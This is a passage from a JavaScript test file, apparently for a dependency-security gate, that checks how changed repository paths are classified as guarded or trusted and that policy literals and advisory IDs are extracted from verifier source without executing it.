    expect(classifyChangedPaths(realPolicy, ["tools/.npmrc"]).guarded).toHaveLength(1);
  });

  it("treats its own infrastructure as trusted, not merely guarded", () => {
    for (const path of realPolicy.trustedPaths) {
      expect(classifyChangedPaths(realPolicy, [path]).trusted, path).toContain(path);
    }
  });

  it("treats every settings asset and pre-trust runbook as trusted", () => {
    for (const path of [
      ".github/trusted-policy/trusted-dependency-artifact-ruleset.plan.json",
      ".github/trusted-policy/trusted-dependency-artifact-app-contract.json",
      ".github/trusted-policy/PRETRUST-REVIEW-RUNBOOK.md",
      ".github/TRUSTED-DEPENDENCY-GATE.md",
      "SECURITY.md",
      "scripts/trusted/Invoke-TrustedDependencyArtifactRuleset.ps1",
      "scripts/trusted/trusted-dependency-ruleset.mjs",
      "scripts/verify-required-checks.mjs",
    ]) {
      expect(realPolicy.trustedPaths).toContain(path);
    }
  });

  it("extracts literals and advisories without evaluating candidate source", () => {
    const literals = extractPolicyLiterals(VERIFIER_SOURCE, "FAST_URI_POLICY");
    expect(literals.get("version")).toBe("3.1.7");
    expect(literals.get("artifactFileCount")).toBe(44);
    expect(extractAdvisoryIds(VERIFIER_SOURCE)).toEqual(
      realPolicy.verifierPolicyLiterals.requiredAdvisories,
    );
  });
});
